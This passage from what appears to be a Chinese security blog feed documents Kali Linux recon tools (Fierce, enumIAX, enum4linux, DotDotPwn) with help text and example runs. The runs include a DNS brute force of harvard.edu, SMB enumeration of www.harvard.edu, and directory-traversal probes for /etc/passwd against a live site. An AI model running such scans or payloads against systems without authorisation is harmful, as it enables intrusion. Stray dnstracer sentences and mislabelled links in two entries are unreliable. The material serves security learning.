class="line">    perl fierce.pl -range 111.222.333.0-255 -dnsserver ns1.example.com</div><div class="line"></div><div class="line">   -search      搜索列表。当Fierce尝试遍历IP空间时，可能会遇到属于同一公司的其他域中的其他服务器。如果您为Fierce</div><div class="line">                提供逗号分隔列表，它将报告找到的任何内容。如果公司服务器的名称与公众访问的网站不同时这将非常有用。  </div><div class="line">                用法：</div><div class="line"></div><div class="line">    perl fierce.pl -dns examplecompany.com -search corpcompany，blahcompany</div><div class="line"></div><div class="line">               请注意，使用搜索还会大大扩展找到的主机数量，因为它会定位您在搜索列表中指定的服务器时继续遍历。所以越</div><div class="line">               多越好</div><div class="line">    -suppress  抑制所有TTY输出（与-file结合使用时）。</div><div class="line">    -tcptimeout指定不同的超时（默认为10秒），如果您正在查询的DNS服务器速度较慢或有很多网络延迟，您可能需要增加此</div><div class="line">               值。-threads指定扫描时使用的线程数（默认为单线程）</div><div class="line">    -traverse  指定IP个数在根据你找到IP数，默认值为5以上</div><div class="line">    -version   输出版本信息</div><div class="line">    -wide      在找到C类中的任何匹配的主机名后，扫描整个C类地址，这将产生了更多的流量，但也可以发现更多的信息。</div><div class="line">    -wordlist  使用单独的单词列表（每行一个单词）。用法：</div><div class="line"></div><div class="line">    perl fierce.pl -dns examplecompany.com -wordlist dictionary.txt</div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-Fierce用法示例"><a href="#0x02-Fierce用法示例" class="headerlink" title="0x02 Fierce用法示例"></a>0x02 Fierce用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fierce -dns harvard.edu -file /root/domains.txt</div><div class="line">Now logging to /root/domains.txt</div><div class="line">DNS Servers for harvard.edu:</div><div class="line">	ext-dns-2.harvard.edu</div><div class="line">	ext-dns-1.harvard.edu</div><div class="line"></div><div class="line">Trying zone transfer first...</div><div class="line">	Testing ext-dns-2.harvard.edu</div><div class="line">		Request timed out or transfer not allowed.</div><div class="line">	Testing ext-dns-1.harvard.edu</div><div class="line">		Request timed out or transfer not allowed.</div><div class="line"></div><div class="line">Unsuccessful in zone transfer (it was worth a shot)</div><div class="line">Okay, trying the good old fashioned way... brute force</div><div class="line"></div><div class="line">Checking for wildcard DNS...</div><div class="line">Nope. Good.</div><div class="line">Now performing 2280 test(s)...</div><div class="line">128.103.149.62	ftscs.hul.harvard.edu</div><div class="line">128.103.149.58	padly2.cadm.harvard.edu</div><div class="line">128.103.149.53	idscs.hul.harvard.edu</div><div class="line">128.103.149.48	krusty-149.soc.harvard.edu. </div><div class="line">128.103.149.45	hu-ldap-legacy.harvard.edu. </div><div class="line">128.103.149.42	icd3.isites.harvard.edu</div><div class="line">128.103.149.37	cs2-public.cadm.harvard.edu. </div><div class="line">128.103.149.34	dbnode1.isites.harvard.edu. </div><div class="line">128.103.149.29	jump128-103-149.soc.harvard.edu. </div><div class="line">128.103.149.24	shstest.hres.harvard.edu</div><div class="line">128.103.149.19	yardi60.hres.harvard.edu</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dns </tag>
            
            <tag> fierce </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之enumIAX]]></title>
      <url>/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BenumIAX/</url>
      <content type="html"><![CDATA[<h2 id="0x00-enumIAX介绍"><a href="#0x00-enumIAX介绍" class="headerlink" title="0x00 enumIAX介绍"></a>0x00 enumIAX介绍</h2><p>enumIAX（enum Inter Asterisk eXchange）是一个Asterisk系统内部交换协议用户名b暴力枚举工具。 enumIAX可以以两种不同的模式进行顺序用户名猜测或字典攻击。</p><p>Asterisk是一款GPLv2协议下的开源电话应用平台。简单来说，Asterisk是一个服务器应用，能够完成发起电话呼叫、接受电话呼叫、对电话呼叫进行定制处理，更多参考<a href="http://blog.chinaunix.net/uid-7947787-id-3194117.html" target="_blank" rel="external">开源应用架构之asterisk</a>。</p><p>工具来源：<a href="http://enumiax.sourceforge.net/" target="_blank" rel="external">http://enumiax.sourceforge.net/</a></p><p><a href="http://enumiax.sourceforge.net/" target="_blank" rel="external">enumIAX主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/enumiax.git;a=summary" target="_blank" rel="external">Kali enumIAX Repo仓库</a></p><ul><li>作者：Dustin D. Trammell</li><li>证书：GPLv2</li></ul><h2 id="0x01-enumIAX功能"><a href="#0x01-enumIAX功能" class="headerlink" title="0x01 enumIAX功能"></a>0x01 enumIAX功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@kali:~# enumiax -h</div><div class="line">enumIAX 0.4a</div><div class="line">Dustin D. Trammell &lt;dtrammell@tippingpoint.com&gt;</div><div class="line"></div><div class="line">用法: enumiax [选项] 目标</div><div class="line">  选项:</div><div class="line">     -d &lt;dict&gt;  使用&lt;dict&gt;文件的字典攻击</div><div class="line">     -i &lt;count&gt; 自动保存的间隔（操作数，默认1000）</div><div class="line">     -m #       最小用户名长度（以字符为单位）</div><div class="line">     -M #       最大用户名长度（以字符为单位）</div><div class="line">     -r #       速率限制呼叫（以微秒为单位）</div><div class="line">     -s &lt;file&gt;  从状态文件读取会话状态</div><div class="line">     -v         增加详细程度（用于更多信息显示）</div><div class="line">     -V         打印版本信息并退出</div><div class="line">     -h         打印帮助/使用信息并退出</div></pre></td></tr></table></figure><h2 id="0x02-enumIAX用法示例"><a href="#0x02-enumIAX用法示例" class="headerlink" title="0x02 enumIAX用法示例"></a>0x02 enumIAX用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 192.168.1.1</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> enumeration </tag>
            
            <tag> voip </tag>
            
            <tag> enumiax </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之enum4linux]]></title>
      <url>/2016/10/23/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Benum4linux/</url>
      <content type="html"><![CDATA[<h2 id="0x00-enum4linux介绍"><a href="#0x00-enum4linux介绍" class="headerlink" title="0x00 enum4linux介绍"></a>0x00 enum4linux介绍</h2><p>enum.exe的Linux替代软件，用于枚举Windows和Samba主机中的数据。</p><p>概述：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Enum4linux是一个用于枚举来自Windows和Samba系统的信息的工具。 它试图提供与以前从www.bindview.com可用的enum.exe类似的功能。</div><div class="line"></div><div class="line">它是用Perl编写的，基本上是一个包装Samba工具smbclient，rpclient，net和nmblookup。</div><div class="line"></div><div class="line">工具的用法可以在下面找到例子，以前版本的工具可以在页面底部找到。</div><div class="line"></div><div class="line">dnstracer用于获取给定主机名从给定域名服务器（DNS）的信息，并跟随DNS服务器链得到权威结果。</div></pre></td></tr></table></figure><p></p><p>主要特性：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">RID循环（当Windows 2000上的RestrictAnonymous设置为1时）</div><div class="line">用户列表（当Windows 2000上的RestrictAnonymous设置为0时）</div><div class="line">组成员信息列表</div><div class="line">共享枚举</div><div class="line">检测主机是否在工作组或域中</div><div class="line">识别远程操作系统</div><div class="line">密码策略检索（使用polenum）</div></pre></td></tr></table></figure><p></p><p>工具来源：<a href="https://labs.portcullis.co.uk/tools/enum4linux/" target="_blank" rel="external">https://labs.portcullis.co.uk/tools/enum4linux/</a></p><p><a href="https://labs.portcullis.co.uk/tools/enum4linux/" target="_blank" rel="external">dnstracer主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/enum4linux.git;a=summary" target="_blank" rel="external">Kali dnstracer Repo仓库</a></p><ul><li><p>作者：Mark Lowe</p></li><li><p>证书：GPLv2</p></li></ul><h2 id="0x01-enum4linux功能"><a href="#0x01-enum4linux功能" class="headerlink" title="0x01 enum4linux功能"></a>0x01 enum4linux功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">root@kali:~# enum4linux -h</div><div class="line">enum4linux v0.8.9 (http://labs.portcullis.co.uk/application/enum4linux/)</div><div class="line">Copyright (C) 2011 Mark Lowe (mrl@portcullis-security.com)</div><div class="line"></div><div class="line">简单的封装了在samba包中的工具，以提供类似的enum.exe功能（以前从www.bindview.com）。 为了方便起见，还增加了一些附加功能，例如RID循环。</div><div class="line"></div><div class="line">用法: ./enum4linux.pl [选项] ip地址</div><div class="line"></div><div class="line">枚举选项：</div><div class="line">     -U        获取用户列表</div><div class="line">     -M        获取机器列表*</div><div class="line">     -S        获取共享列表</div><div class="line">     -P        获取密码策略信息</div><div class="line">     -G        获取组和成员列表</div><div class="line">     -d        详述适用于-U和-S</div><div class="line">     -u user   用户指定要使用的用户名（默认""）</div><div class="line">     -p pass   指定要使用的密码（默认为""）</div><div class="line"></div><div class="line">以下选项是enum.exe未实现的: -L, -N, -D, -f</div><div class="line"></div><div class="line">其他选项:</div><div class="line">    -a        做所有简单枚举（-U -S -G -P -r -o -n -i），如果您没有提供任何其他选项，则启用此选项</div><div class="line">    -h        显示此帮助消息并退出</div><div class="line">    -r        通过RID循环枚举用户</div><div class="line">    -R range  RID范围要枚举（默认值：500-550,1000-1050，隐含-r）</div><div class="line">    -K n      继续搜索RID，直到n个连续的RID与用户名不对应，Impies RID范围结束于999999.对DC有用</div><div class="line">    -l        通过LDAP 389 / TCP获取一些（有限的）信息（仅适用于DN）</div><div class="line">    -s        文件暴力猜测共享名称</div><div class="line">    -k user   远程系统上存在的用户（默认值：administrator，guest，krbtgt，domain admins，root，bin，none）</div><div class="line">              用于获取sid与“lookupsid known_username”</div><div class="line">              使用逗号尝试几个用户：“-k admin，user1，user2”</div><div class="line">    -o        获取操作系统信息</div><div class="line">    -i        获取打印机信息</div><div class="line">    -w wrkg   手动指定工作组（通常自动找到）</div><div class="line">    -n        做一个nmblookup（类似于nbtstat）</div><div class="line">    -v        详细输出，显示正在运行的完整命令（net，rpcclient等）</div><div class="line"></div><div class="line">RID循环应从Windows（或Samba）主机中提取一个用户列表，其中限制匿名设置为1（Windows NT和2000）或启用“网络访问：允许匿名SID /名称转换”（XP，2003）。</div><div class="line"></div><div class="line">注意：Samba服务器通常似乎有RID在范围3000-3050。</div><div class="line"></div><div class="line">依赖性信息：您将需要安装samba包，因为此脚本基本上只是一个包装rpcclient，net，nmblookup和smbclient。 Polenum从http://labs.portcullis.co.uk/application/polenum/需要获取密码政策信息。</div></pre></td></tr></table></figure><h2 id="0x02-enum4linux用法示例"><a href="#0x02-enum4linux用法示例" class="headerlink" title="0x02 enum4linux用法示例"></a>0x02 enum4linux用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">root@kali:~# enum4linux -a -o www.harvard.edu</div><div class="line">Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Oct 24 00:37:22 2016</div><div class="line"></div><div class="line"> ========================== </div><div class="line">|    Target Information    |</div><div class="line"> ========================== </div><div class="line">Target ........... www.harvard.edu</div><div class="line">RID Range ........ 500-550,1000-1050</div><div class="line">Username ......... ''</div><div class="line">Password ......... ''</div><div class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</div><div class="line"></div><div class="line"></div><div class="line"> ======================================================= </div><div class="line">|    Enumerating Workgroup/Domain on www.harvard.edu    |</div><div class="line"> ======================================================= </div><div class="line">[E] Can't find workgroup/domain</div><div class="line"></div><div class="line"></div><div class="line"> =============================================== </div><div class="line">|    Nbtstat Information for www.harvard.edu    |</div><div class="line"> =============================================== </div><div class="line">Looking up status of 104.16.155.6</div><div class="line">No reply from 104.16.155.6</div><div class="line"></div><div class="line"> ======================================== </div><div class="line">|    Session Check on www.harvard.edu    |</div><div class="line"> ======================================== </div><div class="line">Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.</div><div class="line">[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> enumeration </tag>
            
            <tag> smb </tag>
            
            <tag> enum4linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之DotDotPwn]]></title>
      <url>/2016/10/22/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BDotDotPwn/</url>
      <content type="html"><![CDATA[<h2 id="0x00-DotDotPwn介绍"><a href="#0x00-DotDotPwn介绍" class="headerlink" title="0x00 DotDotPwn介绍"></a>0x00 DotDotPwn介绍</h2><p>DotDotPwn是一个非常灵活的智能模糊器，用于发现软件中的遍历目录漏洞，例如HTTP/FTP/TFTP服务器，Web平台的应用程序（如CMS，ERP，博客等）。</p><p>此外，它有一个独立于协议的模块，用于将所需的有效负载发送到指定的主机和端口。 另一方面，它也可以使用STDOUT模块以脚本方式使用。</p><p>DotDotPwn是用perl编程语言编写的，可以在* NIX或Windows平台下运行，它是BackTrack Linux（BT4 R2）中包含的第一个墨西哥人开发的工具。</p><p>此版本支持的模糊模块：</p><p>dnstracer用于获取给定主机名从给定域名服务器（DNS）的信息，并跟随DNS服务器链得到权威结果。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HTTP</div><div class="line">HTTP URL</div><div class="line">FTP</div><div class="line">TFTP</div><div class="line">Payload (Protocol independent)</div><div class="line">STDOUT</div></pre></td></tr></table></figure><p></p><p>工具来源：<a href="https://github.com/wireghoul/dotdotpwn" target="_blank" rel="external">https://github.com/wireghoul/dotdotpwn</a></p><p><a href="http://dotdotpwn.blogspot.ca/" target="_blank" rel="external">DotDotPwn主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/dotdotpwn.git;a=summary" target="_blank" rel="external">Kali DotDotPwn Repo仓库</a></p><ul><li><p>作者：chr1x, nitr0us</p></li><li><p>证书：GPLv2</p></li></ul><h2 id="0x01-DotDotPwn功能"><a href="#0x01-DotDotPwn功能" class="headerlink" title="0x01 DotDotPwn功能"></a>0x01 DotDotPwn功能</h2><p>dotdotpwn.pl - DotDotPwn - 目录遍历模糊器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dotdotpwn</div><div class="line"><span class="meta">#</span>################################################################################</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>  CubilFelino                                                       Chatsubo   #</div><div class="line"><span class="meta">#</span>  Security Research Lab              and            [(in)Security Dark] Labs   #</div><div class="line"><span class="meta">#</span>  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>                               pr0udly present:                                #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>  ________            __  ________            __  __________                   #</div><div class="line"><span class="meta">#</span>  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #</div><div class="line"><span class="meta">#</span>   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #</div><div class="line"><span class="meta">#</span>   |    `   \(  &lt;_&gt; )|  |  |    `   \(  &lt;_&gt; )|  |  |    |     \     /|   |  \  #</div><div class="line"><span class="meta">#</span>  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #</div><div class="line"><span class="meta">#</span>          \/                      \/                                      \/   #</div><div class="line"><span class="meta">#</span>                               - DotDotPwn v3.0 -                              #</div><div class="line"><span class="meta">#</span>                         The Directory Traversal Fuzzer                        #</div><div class="line"><span class="meta">#</span>                         http://dotdotpwn.sectester.net                        #</div><div class="line"><span class="meta">#</span>                            dotdotpwn@sectester.net                            #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>                               by chr1x &amp; nitr0us                              #</div><div class="line"><span class="meta">#</span>################################################################################</div><div class="line"></div><div class="line">用法: ./dotdotpwn.pl -m &lt;模块&gt; -h &lt;主机名&gt; [选项]</div><div class="line">	可用选项:</div><div class="line">	-m	模块 [http | http-url | ftp | tftp | payload | stdout]</div><div class="line">	-h	主机名</div><div class="line">	-O	智能模糊探测操作系统 (nmap模块)</div><div class="line">	-o	操作系统类型已知("windows", "unix" 或者 "generic")</div><div class="line">	-s	服务版本检测(banner信息抓取)</div><div class="line">	-d	遍历深度 (e.g. 深度3为 ../../../; 默认: 6)</div><div class="line">	-f	特定文件名（例如/etc/motd; 默认：根据检测到的操作系统设置，配置文件TraversalEngine.pm）</div><div class="line">	-E	向TraversalEngine.pm添加 @Extra_files文件(例如：web.config, httpd.conf等)</div><div class="line">	-S	使用SSL - 对于HTTP和Payload模块（在http-uri的url中使用https://）</div><div class="line">	-u	要标记网址中遍历的部分(例如：http://foo:8080/id.php?x=TRAVERSAL&amp;y=31337)</div><div class="line">	-k	要在响应中匹配的文字模式（http-url和载荷模块 - 例如，如果尝试/etc/passwd，则需要root权限）</div><div class="line">	-p	要发送的有效负载的文件名和要进行模糊处理的部分用TRAVERSAL关键字标记</div><div class="line">	-x	连接端口 (默认: HTTP=80; FTP=21; TFTP=69)</div><div class="line">	-t	每次测试之间的时间（毫秒，默认: 300 )</div><div class="line">	-X	一旦发现漏洞，使用二分法算法检测确切的深度</div><div class="line">	-e	附加在每个fuzz字符串末尾的文件扩展名 (例如： ".php", ".jpg", ".inc")</div><div class="line">	-U	用户名 (默认: 'anonymous')</div><div class="line">	-P	密码 (默认: 'dot@dot.pwn')</div><div class="line">	-M	HTTP使用'http'模块时请求方式[GET | POST | HEAD | COPY | MOVE] (default: GET)</div><div class="line">	-r	报告文件名 (默认: 'HOST_MM-DD-YYYY_HOUR-MIN.txt')</div><div class="line">	-b	在找到第一个漏洞后中断</div><div class="line">	-q	安静模式（不打印每次尝试）</div><div class="line">	-C	如果未从主机接收到数据则继续</div></pre></td></tr></table></figure><a id="more"></a><h2 id="0x02-DotDotPwn用法示例"><a href="#0x02-DotDotPwn用法示例" class="headerlink" title="0x02 DotDotPwn用法示例"></a>0x02 DotDotPwn用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div></pre></td><td class="code"><pre><div class="line">root@kali:~# dotdotpwn -m http -O -s -S -h www.hackfun.org</div><div class="line"><span class="meta">#</span>################################################################################</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>  CubilFelino                                                       Chatsubo   #</div><div class="line"><span class="meta">#</span>  Security Research Lab              and            [(in)Security Dark] Labs   #</div><div class="line"><span class="meta">#</span>  chr1x.sectester.net                             chatsubo-labs.blogspot.com   #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>                               pr0udly present:                                #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>  ________            __  ________            __  __________                   #</div><div class="line"><span class="meta">#</span>  \______ \    ____ _/  |_\______ \    ____ _/  |_\______   \__  _  __ ____    #</div><div class="line"><span class="meta">#</span>   |    |  \  /  _ \\   __\|    |  \  /  _ \\   __\|     ___/\ \/ \/ //    \   #</div><div class="line"><span class="meta">#</span>   |    `   \(  &lt;_&gt; )|  |  |    `   \(  &lt;_&gt; )|  |  |    |     \     /|   |  \  #</div><div class="line"><span class="meta">#</span>  /_______  / \____/ |__| /_______  / \____/ |__|  |____|      \/\_/ |___|  /  #</div><div class="line"><span class="meta">#</span>          \/                      \/                                      \/   #</div><div class="line"><span class="meta">#</span>                               - DotDotPwn v3.0 -                              #</div><div class="line"><span class="meta">#</span>                         The Directory Traversal Fuzzer                        #</div><div class="line"><span class="meta">#</span>                         http://dotdotpwn.sectester.net                        #</div><div class="line"><span class="meta">#</span>                            dotdotpwn@sectester.net                            #</div><div class="line"><span class="meta">#</span>                                                                               #</div><div class="line"><span class="meta">#</span>                               by chr1x &amp; nitr0us                              #</div><div class="line"><span class="meta">#</span>################################################################################</div><div class="line"></div><div class="line">[+] Report name: Reports/www.hackfun.org_10-23-2016_23-42.txt</div><div class="line"></div><div class="line">[========== TARGET INFORMATION ==========]</div><div class="line">[+] Hostname: www.hackfun.org</div><div class="line">[+] Detecting Operating System (nmap) ...</div><div class="line">[+] Operating System detected: </div><div class="line">[+] Protocol: http</div><div class="line">[+] Port: 443</div><div class="line">[+] Service detected:</div><div class="line">nginx</div><div class="line">[=========== TRAVERSAL ENGINE ===========]</div><div class="line">[+] Creating Traversal patterns (mix of dots and slashes)</div><div class="line">[+] Multiplying 6 times the traversal patterns (-d switch)</div><div class="line">[+] Creating the Special Traversal patterns</div><div class="line">[+] Translating (back)slashes in the filenames</div><div class="line">[+] Adapting the filenames according to the OS type detected (generic)</div><div class="line">[+] Including Special sufixes</div><div class="line">[+] Traversal Engine DONE ! - Total traversal tests created: 19680</div><div class="line"></div><div class="line">[=========== TESTING RESULTS ============]</div><div class="line">[+] Ready to launch 3.33 traversals per second</div><div class="line">[+] Press Enter to start the testing (You can stop it pressing Ctrl + C)</div><div class="line"></div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../windows/system32/drivers/etc/hosts</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../windows/system32/drivers/etc/hosts</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../windows/system32/drivers/etc/hosts</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../windows/system32/drivers/etc/hosts</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../windows/system32/drivers/etc/hosts</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../etc/passwd</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../etc/issue</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../boot.ini</div><div class="line">[*] HTTP Status: 400 | Testing Path: https://www.hackfun.org:443/../../../../../../windows/system32/drivers/etc/hosts</div><div class="line">...</div><div class="line">...</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> dotdotpwn </tag>
            
            <tag> http </tag>
            
            <tag> exploitation tools </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之dnswalk]]></title>
      <url>/2016/10/21/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bdnswalk/</url>
